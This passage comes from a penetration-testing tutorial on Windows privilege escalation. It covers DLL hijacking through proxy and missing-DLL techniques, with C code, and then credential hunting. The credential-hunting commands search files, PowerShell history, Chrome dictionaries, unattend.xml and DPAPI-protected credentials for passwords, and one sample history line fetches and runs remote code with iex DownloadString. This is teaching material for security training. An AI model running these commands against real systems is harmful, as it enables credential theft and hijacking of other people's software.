            isValid = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">else</span>
        {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Invalid input. Please enter an integer: "</span>);
        }
    }

    <span class="hljs-keyword">return</span> value;
}

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    HMODULE hLibrary = LoadLibrary(<span class="hljs-string">"library.dll"</span>);
    <span class="hljs-keyword">if</span> (hLibrary == <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to load library.dll\n"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, <span class="hljs-string">"Add"</span>);
    <span class="hljs-keyword">if</span> (add == <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Failed to locate the 'Add' function\n"</span>);
        FreeLibrary(hLibrary);
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    HMODULE hLibrary = LoadLibrary(<span class="hljs-string">"x.dll"</span>);

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter the first number: "</span>);
    <span class="hljs-keyword">int</span> a = readIntegerInput();

    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Enter the second number: "</span>);
    <span class="hljs-keyword">int</span> b = readIntegerInput();

    <span class="hljs-keyword">int</span> result = add(a, b);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The sum of %d and %d is %d\n"</span>, a, b, result);

    FreeLibrary(hLibrary);
    system(<span class="hljs-string">"pause"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>It loads an <code>add</code> function from the <code>library.dll</code> and utilises this function to add two numbers. Subsequently, it prints the result of the addition. By examining the program in Process Monitor (procmon), we can observe the process of loading the <code>library.dll</code> located in the same directory.</p>
<p>First, let&#39;s set up a filter in procmon to solely include <code>main.exe</code>, which is the process name of the program. This filter will help us focus specifically on the activities related to the execution of <code>main.exe</code>. It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close <code>main.exe</code> and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/procmon.png" alt="image"></p>
<p>Then if you scroll to the bottom, you can see the call to load <code>library.dll</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/procmon-loadimage.png" alt="image"></p>
<p>We can further filter for an <code>Operation</code> of <code>Load Image</code> to only get the libraries the app is loading.</p>
<p>DLL Injection</p>
<pre><code class="lang-shell-session"><span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0074709</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Users\PandaSt0rm\Desktop\Hijack\main.exe    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>xf60000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x26000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0075369</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\ntdll.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x7ffacdbf0000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x214000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0075986</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\SysWOW64\ntdll.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x77a30000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x1af000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0120867</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\wow64.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x7ffacd5a0000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x57000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0122132</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\wow64base.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x7ffacd370000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x9000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0123231</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\wow64win.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x7ffacc750000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x8b000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0124204</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\wow64con.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x7ffacc850000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x16000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0133468</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\System32\wow64cpu.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x77a20000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>xa000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0144586</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\SysWOW64\kernel32.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x76460000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>xf0000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">30</span>,<span class="hljs-number">0146299</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Windows\SysWOW64\KernelBase.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x75dd0000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x272000
<span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">31</span>,<span class="hljs-number">7974779</span>    main.exe    <span class="hljs-number">47792</span>    <span class="hljs-built_in">Load</span> <span class="hljs-built_in">Image</span>    C:\Users\PandaSt0rm\Desktop\Hijack\library.dll    SUCCESS    <span class="hljs-built_in">Image</span> Base: <span class="hljs-number">0</span>x6a1a0000, <span class="hljs-built_in">Image</span> <span class="hljs-built_in">Size</span>: <span class="hljs-number">0</span>x1d000
</code></pre>
<h4 id="proxying">Proxying</h4>
<p>We can utilize a method known as DLL Proxying to execute a Hijack. We will create a new library that will load the function <code>Add</code> from <code>library.dll</code>, tamper with it, and then return it to <code>main.exe</code>.</p>
<ol>
<li>Create a new library: We will create a new library serving as the proxy for <code>library.dll</code>. This library will contain the necessary code to load the <code>Add</code> function from <code>library.dll</code> and perform the required tampering.</li>
<li>Load the <code>Add</code> function: Within the new library, we will load the <code>Add</code> function from the original <code>library.dll</code>. This will allow us to access the original function.</li>
<li>Tamper with the function: Once the <code>Add</code> function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add <code>+ 1</code> to the result.</li>
<li>Return the modified function: After completing the tampering process, we will return the modified <code>Add</code> function from the new library back to <code>main.exe</code>. This will ensure that when <code>main.exe</code> calls the <code>Add</code> function, it will execute the modified version with the intended changes.</li>
</ol>
<p>The code is as follows:</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-comment">// tamper.c</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DLL_EXPORT __declspec(dllexport)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DLL_EXPORT</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*AddFunc)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;

<span class="hljs-function">DLL_EXPORT <span class="hljs-keyword">int</span> <span class="hljs-title">Add</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b)</span>
</span>{
    <span class="hljs-comment">// Load the original library containing the Add function</span>
    HMODULE originalLibrary = LoadLibraryA(<span class="hljs-string">"library.o.dll"</span>);
    <span class="hljs-keyword">if</span> (originalLibrary != <span class="hljs-literal">NULL</span>)
    {
        <span class="hljs-comment">// Get the address of the original Add function from the library</span>
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, <span class="hljs-string">"Add"</span>);
        <span class="hljs-keyword">if</span> (originalAdd != <span class="hljs-literal">NULL</span>)
        {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"============ HIJACKED ============\n"</span>);
            <span class="hljs-comment">// Call the original Add function with the provided arguments</span>
            <span class="hljs-keyword">int</span> result = originalAdd(a, b);
            <span class="hljs-comment">// Tamper with the result by adding +1</span>
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"= Adding 1 to the sum to be evil\n"</span>);
            result += <span class="hljs-number">1</span>;
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">"============ RETURN ============\n"</span>);
            <span class="hljs-comment">// Return the tampered result</span>
            <span class="hljs-keyword">return</span> result;
        }
    }
    <span class="hljs-comment">// Return -1 if the original library or function cannot be loaded</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
}
</code></pre>
<p>Either compile it or use the precompiled version provided. Rename <code>library.dll</code> to <code>library.o.dll</code>, and rename <code>tamper.dll</code> to <code>library.dll</code>.</p>
<p>Running <code>main.exe</code> then shows the successful hack.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/proxy.png" alt="image"></p>
<h4 id="invalid-libraries">Invalid Libraries</h4>
<p>Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. If we change the procmon filter to focus on entries whose path ends in <code>.dll</code> and has a status of <code>NAME NOT FOUND</code> we can find such libraries in <code>main.exe</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/procmon-not-found.png" alt="image"></p>
<p>As we know, <code>main.exe</code> searches in many locations looking for <code>x.dll</code>, but it doesn’t find it anywhere. The entry we are particularly interested in is:</p>
<p>DLL Injection</p>
<pre><code class="lang-shell-session"><span class="hljs-number">17</span>:<span class="hljs-number">55</span>:<span class="hljs-number">39</span>,<span class="hljs-number">7848570</span>    main.exe    <span class="hljs-number">37940</span>    CreateFile    C:\Users\PandaSt0rm\Desktop\Hijack\x.dll    <span class="hljs-keyword">NAME</span> <span class="hljs-keyword">NOT</span> FOUND    Desired Access: <span class="hljs-keyword">Read</span> Attributes, Disposition: <span class="hljs-keyword">Open</span>, Options: <span class="hljs-keyword">Open</span> Reparse <span class="hljs-keyword">Point</span>, Attributes: n/a, Sha<span class="hljs-comment">reMode: Read, Write, Delete, AllocationSize: n/a</span>
</code></pre>
<p>Where it is looking to load <code>x.dll</code> from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in <code>x.dll</code>.</p>
<p>Code: c</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call)
    {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    {
        printf(<span class="hljs-string">"Hijacked... Oops...\n"</span>)<span class="hljs-comment">;</span>
    }
    <span class="hljs-built_in">break</span><span class="hljs-comment">;</span>
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-built_in">break</span><span class="hljs-comment">;</span>
    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
        <span class="hljs-built_in">break</span><span class="hljs-comment">;</span>
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
        <span class="hljs-built_in">break</span><span class="hljs-comment">;</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>This code defines a DLL entry point function called <code>DllMain</code> that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print <code>Hijacked... Oops...</code> to the terminal, but you could theoretically do anything here.</p>
<p>Either compile it or use the precompiled version provided. Rename <code>hijack.dll</code> to <code>x.dll</code>, and run <code>main.exe</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/hijack.png" alt="image"></p>
<h2 id="credential-hunting">Credential Hunting</h2>
<hr>
<p>Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.</p>
<hr>
<h3 id="application-configuration-files">Application Configuration Files</h3>
<p><strong>Searching for Files</strong></p>
<p>Against best practices, applications often store passwords in cleartext config files. Suppose we gain command execution in the context of an unprivileged user account. In that case, we may be able to find credentials for their admin account or another privileged local or domain account. We can use the <a href="https://ss64.com/nt/findstr.html">findstr</a> utility to search for this sensitive information.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; findstr /SIM /C:<span class="hljs-string">"password"</span> *<span class="hljs-selector-class">.txt</span> *<span class="hljs-selector-class">.ini</span> *<span class="hljs-selector-class">.cfg</span> *<span class="hljs-selector-class">.config</span> *.xml
</code></pre>
<p>Sensitive IIS information such as credentials may be stored in a <code>web.config</code> file. For the default IIS website, this could be located at <code>C:\inetpub\wwwroot\web.config</code>, but there may be multiple versions of this file in different locations, which we can search for recursively.</p>
<hr>
<h3 id="dictionary-files">Dictionary Files</h3>
<p><strong>Chrome Dictionary Files</strong></p>
<p>Another interesting case is dictionary files. For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn&#39;t recognize. The user may add these words to their dictionary to avoid the distracting red underline.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; gc 'C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\G</span>oogle<span class="hljs-symbol">\C</span>hrome<span class="hljs-symbol">\U</span>ser Data<span class="hljs-symbol">\D</span>efault<span class="hljs-symbol">\C</span>ustom Dictionary.txt' | Select-String password

Password1234!
</code></pre>
<hr>
<h3 id="unattended-installation-files">Unattended Installation Files</h3>
<p>Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the <code>unattend.xml</code> are stored in plaintext or base64 encoded.</p>
<p><strong>Unattend.xml</strong></p>
<p>Code: xml</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-tag">&lt;<span class="hljs-name">unattend</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"urn:schemas-microsoft-com:unattend"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">pass</span>=<span class="hljs-string">"specialize"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Microsoft-Windows-Shell-Setup"</span> <span class="hljs-attr">processorArchitecture</span>=<span class="hljs-string">"amd64"</span> <span class="hljs-attr">publicKeyToken</span>=<span class="hljs-string">"31bf3856ad364e35"</span> <span class="hljs-attr">language</span>=<span class="hljs-string">"neutral"</span> <span class="hljs-attr">versionScope</span>=<span class="hljs-string">"nonSxS"</span> <span class="hljs-attr">xmlns:wcm</span>=<span class="hljs-string">"http://schemas.microsoft.com/WMIConfig/2002/State"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">AutoLogon</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Password</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">Value</span>&gt;</span>local_4dmin_p@ss<span class="hljs-tag">&lt;/<span class="hljs-name">Value</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">PlainText</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">PlainText</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">Password</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Enabled</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Enabled</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">LogonCount</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">LogonCount</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">Username</span>&gt;</span>Administrator<span class="hljs-tag">&lt;/<span class="hljs-name">Username</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">AutoLogon</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ComputerName</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">ComputerName</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span>
</code></pre>
<p>Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.</p>
<hr>
<h3 id="powershell-history-file">PowerShell History File</h3>
<p><strong>Command to</strong></p>
<p>Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:</p>
<ul>
<li><code>C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code>.</li>
</ul>
<p><strong>Confirming PowerShell History Save Path</strong></p>
<p>As seen in the (handy) Windows Commands PDF, published by Microsoft <a href="https://download.microsoft.com/download/5/8/9/58911986-D4AD-4695-BF63-F734CD4DF8F2/ws-commands.pdf">here</a>, there are many commands which can pass credentials on the command line. We can see in the example below that the user-specified local administrative credentials to query the Application Event Log using <a href="https://ss64.com/nt/wevtutil.html">wevutil</a>.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; (Get-PSReadLineOption).HistorySavePath

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb-student<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\R</span>oaming<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\P</span>owerShell<span class="hljs-symbol">\P</span>SReadLine<span class="hljs-symbol">\C</span>onsoleHost_history.txt
</code></pre>
<p><strong>Reading PowerShell History File</strong></p>
<p>Once we know the file&#39;s location (the default path is above), we can attempt to read its contents using <code>gc</code>.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-string">C:</span>\htb&gt; gc (Get-PSReadLineOption).HistorySavePath

dir
cd Temp
md backups
cp <span class="hljs-string">c:</span>\inetpub\wwwroot\* .\backups\
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor <span class="hljs-number">3072</span>; iex ((New-Object System.Net.WebClient).DownloadString(<span class="hljs-string">'https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'</span>))
. .\Get-IISsite.ps1
Get-IISsite -Server WEB02 -web <span class="hljs-string">"Default Web Site"</span>
wevtutil qe Application <span class="hljs-string">"/q:*[Application [(EventID=3005)]]"</span> <span class="hljs-regexp">/f:text /</span><span class="hljs-string">rd:</span><span class="hljs-literal">true</span> <span class="hljs-regexp">/u:WEB02\administrator /</span><span class="hljs-string">p:</span><span class="hljs-number">5</span>erv3rAdmin! /<span class="hljs-string">r:</span>WEB02
</code></pre>
<p>We can also use this one-liner to retrieve the contents of all Powershell history files that we can access as our current user. This can also be extremely helpful as a post-exploitation step. We should always recheck these files once we have local admin if our prior access did not allow us to read the files for some users. This command assumes that the default save path is being used.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">htb</span></span>&gt; foreach(<span class="hljs-formula">$user in ((ls C:<span class="hljs-tag">\<span class="hljs-name">users</span></span>).fullname)){cat "$</span>user<span class="hljs-tag">\<span class="hljs-name">AppData</span></span><span class="hljs-tag">\<span class="hljs-name">Roaming</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span><span class="hljs-tag">\<span class="hljs-name">PowerShell</span></span><span class="hljs-tag">\<span class="hljs-name">PSReadline</span></span><span class="hljs-tag">\<span class="hljs-name">ConsoleHost</span></span>_history.txt" -ErrorAction SilentlyContinue}

dir
cd Temp
md backups
cp c:<span class="hljs-tag">\<span class="hljs-name">inetpub</span></span><span class="hljs-tag">\<span class="hljs-name">wwwroot</span></span><span class="hljs-tag">\<span class="hljs-name">*</span></span> .<span class="hljs-tag">\<span class="hljs-name">backups</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://www.powershellgallery.com/packages/MrAToolbox/1.0.1/Content/Get-IISSite.ps1'))
. .<span class="hljs-tag">\<span class="hljs-name">Get</span></span>-IISsite.ps1
Get-IISsite -Server WEB02 -web "Default Web Site"
wevtutil qe Application "/q:*[Application [(EventID=3005)]]" /f:text /rd:true /u:WEB02<span class="hljs-tag">\<span class="hljs-name">administrator</span></span> /p:5erv3rAdmin! /r:WEB02
</code></pre>
<hr>
<h3 id="powershell-credentials">PowerShell Credentials</h3>
<p>PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using <a href="https://en.wikipedia.org/wiki/Data\_Protection\_API">DPAPI</a>, which typically means they can only be decrypted by the same user on the same computer they were created on.</p>
<p>Take, for example, the following script <code>Connect-VC.ps1</code>, which a sysadmin has created to connect to a vCenter server easily.</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell"># <span class="hljs-keyword">Connect</span>-VC.ps1
# <span class="hljs-keyword">Get</span>-Credential | <span class="hljs-keyword">Export</span>-Clixml -<span class="hljs-keyword">Path</span> <span class="hljs-string">'C:\scripts\pass.xml'</span>
$encryptedPassword = <span class="hljs-keyword">Import</span>-Clixml -<span class="hljs-keyword">Path</span> <span class="hljs-string">'C:\scripts\pass.xml'</span>
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
<span class="hljs-keyword">Connect</span>-VIServer -Server <span class="hljs-string">'VC-01'</span> -User <span class="hljs-string">'bob_adm'</span> -Password $decryptedPassword
</code></pre>
<p><strong>Decrypting PowerShell Credentials</strong></p>
<p>If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from <code>encrypted.xml</code>. The example below assumes the former.</p>
<p>Credential Hunting</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; <span class="hljs-variable">$credential</span> = Import-Clixml -Path <span class="hljs-string">'C:\scripts\pass.xml'</span>
PS C:\htb&gt; <span class="hljs-variable">$credential</span>.GetNetworkCredential()<span class="hljs-selector-class">.username</span>

bob


PS C:\htb&gt; <span class="hljs-variable">$credential</span>.GetNetworkCredential()<span class="hljs-selector-class">.password</span>

Str0ng3ncryptedP@ss!
</code></pre>
<h2 id="other-files">Other Files</h2>
<hr>
<p>There are many other types of files that we may find on a local system or on network share drives that may contain credentials or additional information that can be used to escalate privileges. In an Active Directory environment, we can use a tool such as <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> to crawl network share drives for interesting file extensions such as <code>.kdbx</code>, <code>.vmdk</code>, <code>.vdhx</code>, <code>.ppk</code>, etc. We may find a virtual hard drive that we can mount and extract local administrator password hashes from, an SSH private key that can be used to access other systems, or instances of users storing passwords in Excel/Word Documents, OneNote workbooks, or even the classic <code>passwords.txt</code> file. I have performed many penetration tests where a password found on a share drive or local drive led to either initial access or privilege escalation. Many companies provide each employee with a folder on a file share mapped to their user id, i.e., the folder <code>bjones</code> on the <code>users</code> share on a server called <code>FILE01</code> with loose permissions applied (i.e., all Domain Users with read access to all user folders). We often find users saving sensitive personal data in these folders, unaware they are accessible to everyone in the network and not just local to their workstation.</p>
<hr>
<h3 id="manually-searching-the-file-system-for-credentials">Manually Searching the File System for Credentials</h3>
<p>We can search the file system or share drive(s) manually using the following commands from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-a-file-with-a-certain-filename">this cheatsheet</a></p>
<p><strong>Search File Contents for String - Example 1</strong></p>
<p>Other Files</p>
<pre><code class="lang-cmd-session">C:\htb&gt; cd c:\Users\htb-student\Documents &amp; findstr /SI /M <span class="hljs-string">"password"</span> *<span class="hljs-selector-class">.xml</span> *<span class="hljs-selector-class">.ini</span> *<span class="hljs-selector-class">.txt</span>

stuff.txt
</code></pre>
<p><strong>Search File Contents for String - Example 2</strong></p>
<p>Other Files</p>
<pre><code class="lang-cmd-session">C:\htb&gt; findstr /si password *<span class="hljs-selector-class">.xml</span> *<span class="hljs-selector-class">.ini</span> *<span class="hljs-selector-class">.txt</span> *<span class="hljs-selector-class">.config</span>

stuff<span class="hljs-selector-class">.txt</span>:password: l#-x9r11_2_GL!
</code></pre>
<p><strong>Search File Contents for String - Example 3</strong></p>
<p>Other Files</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; findstr /spin <span class="hljs-string">"password"</span> *.*

<span class="hljs-symbol">stuff.txt:</span><span class="hljs-number">1</span>:password: l<span class="hljs-meta">#-x9r11_2_GL!</span>
</code></pre>
<p><strong>Search File Contents with PowerShell</strong></p>
<p>We can also search using PowerShell in a variety of ways. Here is one example.</p>
<p>Other Files</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">select-string</span> <span class="hljs-selector-tag">-Path</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb-student</span>\<span class="hljs-selector-tag">Documents</span>\*<span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">-Pattern</span> <span class="hljs-selector-tag">password</span>

<span class="hljs-selector-tag">stuff</span><span class="hljs-selector-class">.txt</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:password</span>: <span class="hljs-selector-tag">l</span><span class="hljs-selector-id">#-x9r11_2_GL</span>!
</code></pre>
<p><strong>Search for File Extensions - Example 1</strong></p>
<p>Other Files</p>
<pre><code class="lang-cmd-session">C:\htb&gt; dir /S /B <span class="hljs-strong">*pass*</span>.txt == <span class="hljs-strong">*pass*</span>.xml == <span class="hljs-strong">*pass*</span>.ini == <span class="hljs-strong">*cred*</span> == <span class="hljs-strong">*vnc*</span> == <span class="hljs-strong">*.config*</span>

c:\inetpub\wwwroot\web.config
</code></pre>
<p><strong>Search for File Extensions - Example 2</strong></p>
<p>Other Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; where /R C:<span class="hljs-symbol">\ </span>*.config

